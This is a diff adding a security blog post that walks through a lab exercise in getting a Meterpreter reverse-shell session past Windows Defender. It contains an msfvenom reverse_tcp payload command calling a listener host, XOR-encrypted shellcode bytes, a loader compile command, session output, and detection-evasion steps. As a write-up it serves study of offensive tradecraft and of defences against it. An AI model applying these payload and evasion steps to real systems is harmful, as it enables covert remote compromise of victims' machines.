@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>Meterpreter: Bypassing Defender | 0x0ff537</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="description" content="In this post I&rsquo;ll describe the approach taken to be able to get a meterpreter session in a default updated installation of windows 10 with all the security features enabled. This is not new and there&rsquo;s a lot of info out there if you google for it, so it&rsquo;s more of an exercise to practice evasion techniques using one of the most fingerprinted hacking frameworks out there (or at least I think so).">
+    <meta name="generator" content="Hugo 0.101.0" />
+    
+    
+    
+    
+      <meta name="robots" content="noindex, nofollow">
+    
+
+    
+<link rel="stylesheet" href="/ananke/css/main.min.css" >
+
+
+
+  
+
+    
+    
+    
+      
+
+    
+
+    
+    
+    <meta property="og:title" content="Meterpreter: Bypassing Defender" />
+<meta property="og:description" content="In this post I&rsquo;ll describe the approach taken to be able to get a meterpreter session in a default updated installation of windows 10 with all the security features enabled. This is not new and there&rsquo;s a lot of info out there if you google for it, so it&rsquo;s more of an exercise to practice evasion techniques using one of the most fingerprinted hacking frameworks out there (or at least I think so)." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0x0ff537.github.io/post/bypassingdefender/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2023-08-04T20:58:24-06:00" />
+<meta property="article:modified_time" content="2023-08-04T20:58:24-06:00" />
+
+<meta itemprop="name" content="Meterpreter: Bypassing Defender">
+<meta itemprop="description" content="In this post I&rsquo;ll describe the approach taken to be able to get a meterpreter session in a default updated installation of windows 10 with all the security features enabled. This is not new and there&rsquo;s a lot of info out there if you google for it, so it&rsquo;s more of an exercise to practice evasion techniques using one of the most fingerprinted hacking frameworks out there (or at least I think so)."><meta itemprop="datePublished" content="2023-08-04T20:58:24-06:00" />
+<meta itemprop="dateModified" content="2023-08-04T20:58:24-06:00" />
+<meta itemprop="wordCount" content="1405">
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Meterpreter: Bypassing Defender"/>
+<meta name="twitter:description" content="In this post I&rsquo;ll describe the approach taken to be able to get a meterpreter session in a default updated installation of windows 10 with all the security features enabled. This is not new and there&rsquo;s a lot of info out there if you google for it, so it&rsquo;s more of an exercise to practice evasion techniques using one of the most fingerprinted hacking frameworks out there (or at least I think so)."/>
+
+	
+  </head>
+
+  <body class="ma0 sans-serif">
+
+    
+   
+  
+
+  
+  <header class="cover bg-top" style="background-image: url('https://0x0ff537.github.io/images/404.jpg');">
+    <div class="bg-black-60">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l justify-between items-center center">
+    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
+      
+        <img src="/images/logo.png" class="w100 mw5-ns" alt="0x0ff537" />
+      
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+        <ul class="pl0 mr3">
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white no-underline white-90" href="/about/" title="About me page">
+              About me
+            </a>
+          </li>
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white no-underline white-90" href="/post/" title="Posts page">
+              Posts
+            </a>
+          </li>
+          
+        </ul>
+      
+      
+<div class="ananke-socials">
+  
+    <a href="https://github.com/0x0ff537/" target="_blank" class="github ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 512 512;" version="1.1" viewBox="0 0 512 512"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+  <path d="M256,32C132.3,32,32,134.8,32,261.7c0,101.5,64.2,187.5,153.2,217.9c11.2,2.1,15.3-5,15.3-11.1   c0-5.5-0.2-19.9-0.3-39.1c-62.3,13.9-75.5-30.8-75.5-30.8c-10.2-26.5-24.9-33.6-24.9-33.6c-20.3-14.3,1.5-14,1.5-14   c22.5,1.6,34.3,23.7,34.3,23.7c20,35.1,52.4,25,65.2,19.1c2-14.8,7.8-25,14.2-30.7c-49.7-5.8-102-25.5-102-113.5   c0-25.1,8.7-45.6,23-61.6c-2.3-5.8-10-29.2,2.2-60.8c0,0,18.8-6.2,61.6,23.5c17.9-5.1,37-7.6,56.1-7.7c19,0.1,38.2,2.6,56.1,7.7   c42.8-29.7,61.5-23.5,61.5-23.5c12.2,31.6,4.5,55,2.2,60.8c14.3,16.1,23,36.6,23,61.6c0,88.2-52.4,107.6-102.3,113.3   c8,7.1,15.2,21.1,15.2,42.5c0,30.7-0.3,55.5-0.3,63c0,6.1,4,13.3,15.4,11C415.9,449.1,480,363.1,480,261.7   C480,134.8,379.7,32,256,32z"/>
+</svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+    <a href="https://twitter.com/0x0ff53t/" target="_blank" class="twitter ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Twitter link" rel="noopener" aria-label="follow on Twitter——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+</div>
+
+    </div>
+  </div>
+</nav>
+
+      <div class="tc-l pv6 ph3 ph4-ns">
+        
+          <h1 class="f2 f1-l fw2 white-90 mb0 lh-title">Meterpreter: Bypassing Defender</h1>
+          
+        
+      </div>
+    </div>
+  </header>
+
+
+
+    <main class="pb7" role="main">
+      
+  
+  <article class="flex-l flex-wrap justify-between mw8 center ph3">
+    <header class="mt4 w-100">
+      <aside class="instapaper_ignoref b helvetica tracked">
+          
+        POSTS
+      </aside>
+      
+
+
+
+
+
+
+
+
+
+
+  <div id="sharing" class="mt3 ananke-socials">
+    
+      
+      <a href="https://twitter.com/share?url=https://0x0ff537.github.io/post/bypassingdefender/&amp;text=Meterpreter:%20Bypassing%20Defender" class="ananke-social-link twitter no-underline" aria-label="share on Twitter">
+        
+        <span class="icon"> <svg style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
+</span>
+        
+      </a>
+    
+  </div>
+
+
+      <h1 class="f1 athelas mt3 mb1">Meterpreter: Bypassing Defender</h1>
+      
+      
+      
+      <time class="f6 mv4 dib tracked" datetime="2023-08-04T20:58:24-06:00">August 4, 2023</time>
+      
+
+      
+      
+    </header>
+    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr0 w-100"><p>In this post I&rsquo;ll describe the approach taken to be able to get a meterpreter session in a default updated installation of windows 10 with all the security features enabled. This is not new and there&rsquo;s a lot of info out there if you google for it, so it&rsquo;s more of an exercise to practice evasion techniques using one of the most fingerprinted hacking frameworks out there (or at least I think so).</p>
+<p>For this exercise I&rsquo;ll use a windows 10 machine to create and compile a custom loader and kali linux to run msfconsole.</p>
+<p>So the steps to follow are:</p>
+<ul>
+<li>Create shellcode.</li>
+<li>Create the loader.</li>
+<li>Testing and debugging.</li>
+<li>Obtaining final undetectable loader.</li>
+</ul>
+<h2 id="the-shellcode">The shellcode</h2>
+<p>In order to create the malicious piece of code I&rsquo;ll use msfvenom, slecting a windows x64 meterpreter reverse tcp payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.188.163 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">8443</span> -f raw -o www/msf_tcp_8443.bin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
+</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">510</span> bytes
+</span></span><span style="display:flex;"><span>Saved as: www/msf_tcp_8443.bin
+</span></span></code></pre></div><p>As you can notice I&rsquo;m saving the raw binary data into a file called msf_tcp_8443.bin inside a directory named www, I&rsquo;ll use it to save items I need to pass to my windows machine with the help of a simple python http server.</p>
+<p>We all know that plain msfvenom shellcode is well known by any AV/EDR/XDR and will be detected once the file touches disk, so first I&rsquo;ll encrypt it with a using XOR binary operation, I&rsquo;ll use a random string as key. For this I&rsquo;ll create a python script that will save the resulting bytes in a file called <em>payload</em>:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><img src="/images/python_xor.png" alt="python?xor"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><em>Full code can be found <a href="https://github.com/0x0ff537">here</a></em></td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; python3 xorencrypt.py www/msf_tcp_8443.bin 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> File written to payload
+</span></span></code></pre></div><p>Once done, I&rsquo;ll use <em>xxd</em> to convert <em>payload</em> (which at the moment contains raw binary data) into a header file that can be included in the loader. This will store the shellcode in the .rdata section of the final PE loader.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; xxd -i payload &gt; www/out.h
+</span></span></code></pre></div><p>This is the file that I&rsquo;ll pass to the development windows machine. In such machine I&rsquo;ll create a directory called <em>msf_loader</em> which will be added to Defender&rsquo;s exceptions so I can work without defender deleting my files</p>
+<h2 id="the-loader">The loader</h2>
+<p>To have more control over the shellcode injection I&rsquo;ll create a custom loader, a simple but effective one. Inside <em>msf_loader</em> directory I&rsquo;ll create a file called loader.cpp and include the following main function:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><img src="/images/main_loader.png" alt="main_loader"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><em>Full code can be found <a href="https://github.com/0x0ff537">here</a></em></td>
+</tr>
+</tbody>
+</table>
+<p>I&rsquo;ll go quickly over the loader. First, it&rsquo;ll dinamycally resolve the address of VirtualAlloc to avoid having such WIN32API as an imported function, the same goes for VirtualProtect which will be used later on. Then a loop will XOR decrypt the shellcode in place, then a similar loop will copy the decrypted shellcode into the allocated space in memory. Now, with the previously obtained address of VirtualProtect I&rsquo;ll change the permissions of the shellcode in memory to PAGE_EXECUTE_READ. Finally, I&rsquo;ll cast the allocated memory space to a function and execute it.</p>
+<p>The variables <em>payload</em> and <em>payload_len</em> are defined in out.h, the name of the variables are automatically assigned by <em>xxd</em> based on the name of the file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; head out.h
+</span></span><span style="display:flex;"><span>unsigned char payload<span style="color:#f92672">[]</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  0x96, 0x21, 0xe8, 0x8b, 0x95, 0x9f, 0xad, 0x72, 0x66, 0x6b, 0x2c, 0x2b,
+</span></span><span style="display:flex;"><span>  0x32, 0x34, 0x3e, 0x20, 0x57, 0xbc, 0x24, 0x0c, 0x3f, 0xea, 0x37, 0x0a,
+</span></span><span style="display:flex;"><span>  0x3a, 0xfb, 0x33, 0x6f, 0x3c, 0x21, 0xe0, 0x3d, 0x45, 0x3a, 0x50, 0xbb,
+</span></span><span style="display:flex;"><span>  0x2e, 0xe0, 0x1f, 0x2a, 0x3b, 0x6b, 0xdb, 0x22, 0x2c, 0x26, 0x44, 0xa9,
+</span></span><span style="display:flex;"><span>  0xdb, 0x5d, 0x04, 0x16, 0x70, 0x5c, 0x41, 0x36, 0xab, 0xa0, 0x66, 0x2e,
+</span></span><span style="display:flex;"><span>  0x64, 0xb6, 0x83, 0x9f, 0x34, 0x2a, 0x3c, 0x32, 0xf8, 0x36, 0x4c, 0xe3,
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; tail out.h
+</span></span><span style="display:flex;"><span>  0xa3, 0x20, 0xe2, 0x9f, 0x2d, 0xfe, 0xbb, 0x3a, 0xef, 0x92, 0x2c, 0xc0,
+</span></span><span style="display:flex;"><span>  0x71, 0xbd, 0xa4, 0x37, 0x99, 0xbb, 0xf6, 0x91, 0x77, 0x1c, 0x4d, 0x32,
+</span></span><span style="display:flex;"><span>  0x33, 0x27, 0x38, 0x1f, 0x6a, 0x29, 0x6b, 0x6f, 0x24, 0x2f, 0x0b, 0x72,
+</span></span><span style="display:flex;"><span>  0x3c, 0x2a, 0xd7, 0x71, 0x5c, 0x6b, 0x5c, 0x97, 0xb3, 0x39, 0x2c, 0x28,
+</span></span><span style="display:flex;"><span>  0xcd, 0x14, 0x0b, 0x27, 0x13, 0x8f, 0xb4, 0x3e, 0x95, 0xa7, 0x82, 0x53,
+</span></span><span style="display:flex;"><span>  0x9a, 0x88, 0x9e, 0x3a, 0x67, 0xa8, 0x25, 0x53, 0xb5, 0x2c, 0xe9, 0x9e,
+</span></span><span style="display:flex;"><span>  0x13, 0xda, 0x34, 0x96, 0x90, 0x39, 0x0f, 0x6a, 0x2b, 0x39, 0xa6, 0xb5,
+</span></span><span style="display:flex;"><span>  0x9a, 0xdc, 0xc9, 0x39, 0x9a, 0xa2
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>;
+</span></span><span style="display:flex;"><span>unsigned int payload_len <span style="color:#f92672">=</span> 510;
+</span></span></code></pre></div><p>Now I&rsquo;ll compile it and check if the connection is established. To compile the code I&rsquo;ll use <em>cl.exe</em> (this tool is installed by Visual Studio and the C++ environment).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>&gt; cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG *.cpp /link /OUT<span style="color:#960050;background-color:#1e0010">:</span>msf_loader.exe
+</span></span></code></pre></div><p>Before executing the loader I&rsquo;ll have to start the msfconsole multi handler with all the correct settings and disable defender (I want to make sure it works 100% right). Once done, i&rsquo;ts time to run the loader &hellip; in kali&rsquo;s terminal:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; exploit 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 192.168.188.163:8443 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">200774</span> bytes<span style="color:#f92672">)</span> to 192.168.188.137
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>192.168.188.163:8443 -&gt; 192.168.188.137:50463<span style="color:#f92672">)</span> at 2023-08-04 06:57:05 +0100
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt;
+</span></span></code></pre></div><h3 id="i-got-a-connection-back">I got a connection back!</h3>
+<p>So far it works but if I scan it with <a href="https://github.com/rasta-mouse/ThreatCheck">ThreatCheck</a> I can see it is flagged as malicious, and also I can see the malicious bytes that are triggering the detection. ThreatCheck will show the end of the piece of bytes that are triggering the alert.</p>
+<p><img src="/images/threatcheck_result.png" alt="threatcheck_result"></p>
+<p>Examining the executable with <a href="https://github.com/hasherezade/pe-bear">PE-Bear</a> and navigating to offset 0x174aa I can see that the &ldquo;bad bytes&rdquo; are stored in the _RDATA section, which is a read-only section. Then I want to know when/where are this bytes read and used for. I load the executable in x64dbg and set a memory access breakpoint at the address where the bad bytes are found:</p>
+<p><img src="/images/breakpoint.png" alt="breakpoint"></p>
+<p>The debugger breaks at a very close address:</p>
+<p><img src="/images/breakpoint_2.png" alt="breakpoint_2"></p>
+<p>Looking at the dissasembly it seems that the bad bytes are just offsets, like a relocation table. Continuing with the debugging I can see that some other close addresses are also accessed but not the end of the bad bytes. So I&rsquo;ll try to use <a href="https://cutter.re/">Cutter</a> to zero out some bad bytes, obviously the ones that were not accessed while debugging.</p>
+<p>Original bytes:</p>
+<p><img src="/images/cutter_before.png" alt="cutter_before"></p>
+<p>After zero them out:</p>
+<p><img src="/images/cutter_after.png" alt="cutter_after"></p>
+<p>Then I&rsquo;ll proceed to scan it again with ThreatCheck:</p>
+<p><img src="/images/bypass_static.png" alt="bypass_static"></p>
+<p>As you can see the executable is no longer detected by Defender, so let&rsquo;s test it out! First I drag and drop the executable to the desktop, this action will trigger Defender, and it will scan the file. I just let it sit there for some minutes and there&rsquo;s no alert at all. After running it I got a connection back but the process is almost killed immediately b Defender, it detected the behavior this time.</p>
+<p>Zeroing out 6 bytes of the executable were enough to bypass static analysis, but we still need to deal with behavior detection. To do it I can test out 2 approaches, the first one will be to use a https payload that will encrypt the communication between the shellcode and the server. Right now I&rsquo;m using a tcp payload so all the communication is sent in plaint text. I tried this but it&rsquo;s being detected again, so it&rsquo;s not about encrypting the communication. The second thing I&rsquo;ll try is to use some advanced settings in meterpreter, I&rsquo;ll disable AutoLoadStdapi which won&rsquo;t load the meterpreter&rsquo;s Stdapi extension, enable EnableStageEncoding and set StageEncoder to use x64/zutto_dekiru to encode the stager payload. All of these advanced settings will be used along with the tcp payload.</p>
+<p>After compiling a new executable and doing the above steps once again, I drop it in the desktop and run it, this time Defender doesn&rsquo;t detect it, so I proceed to load the stdapi extension and try our some meterpreter commands:</p>
+<p><img src="/images/met_sess.png" alt="met_sess"></p>
+<p>It works fine and doesn&rsquo;t seem to trigger any alerts yet, so I try some more commands:</p>
+<p><img src="/images/met_commands.png" alt="met_commands"></p>
+<p>Cool, it works fine. Obviously some actions will still trigger alerts, like spawning a shell, but I&rsquo;m still able to take some actions to gather information about the infected system.</p>
+<h2 id="conclusions">Conclusions</h2>
+<p>This was a good practice for me. As always, I tried to break the problem into small problems, for example trying to evade static detection first. Also, playing with the different built-in options of the C2 and testing possible solutions is useful to understand how the security product in place works, obviously this can be taken further and use a https/mTLS/custom encryption instead of a plain tcp connection, use a less fingerprinted C2 like metasploit and so on.</p>
+<p>Keep on hacking!</p>
+<ul class="pa0">
+  
+</ul>
+<div class="mt6 instapaper_ignoref">
+      
+      
+      </div>
+    </div>
+
+  </article>
+
+    </main>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://0x0ff537.github.io" >
+    &copy;  0x0ff537 2023 
+  </a>
+    <div>
+<div class="ananke-socials">
+  
+    <a href="https://github.com/0x0ff537/" target="_blank" class="github ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 512 512;" version="1.1" viewBox="0 0 512 512"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+  <path d="M256,32C132.3,32,32,134.8,32,261.7c0,101.5,64.2,187.5,153.2,217.9c11.2,2.1,15.3-5,15.3-11.1   c0-5.5-0.2-19.9-0.3-39.1c-62.3,13.9-75.5-30.8-75.5-30.8c-10.2-26.5-24.9-33.6-24.9-33.6c-20.3-14.3,1.5-14,1.5-14   c22.5,1.6,34.3,23.7,34.3,23.7c20,35.1,52.4,25,65.2,19.1c2-14.8,7.8-25,14.2-30.7c-49.7-5.8-102-25.5-102-113.5   c0-25.1,8.7-45.6,23-61.6c-2.3-5.8-10-29.2,2.2-60.8c0,0,18.8-6.2,61.6,23.5c17.9-5.1,37-7.6,56.1-7.7c19,0.1,38.2,2.6,56.1,7.7   c42.8-29.7,61.5-23.5,61.5-23.5c12.2,31.6,4.5,55,2.2,60.8c14.3,16.1,23,36.6,23,61.6c0,88.2-52.4,107.6-102.3,113.3   c8,7.1,15.2,21.1,15.2,42.5c0,30.7-0.3,55.5-0.3,63c0,6.1,4,13.3,15.4,11C415.9,449.1,480,363.1,480,261.7   C480,134.8,379.7,32,256,32z"/>
+</svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+    <a href="https://twitter.com/0x0ff53t/" target="_blank" class="twitter ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Twitter link" rel="noopener" aria-label="follow on Twitter——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+</div>
+</div>
+  </div>
+</footer>
+
+  </body>
+</html>
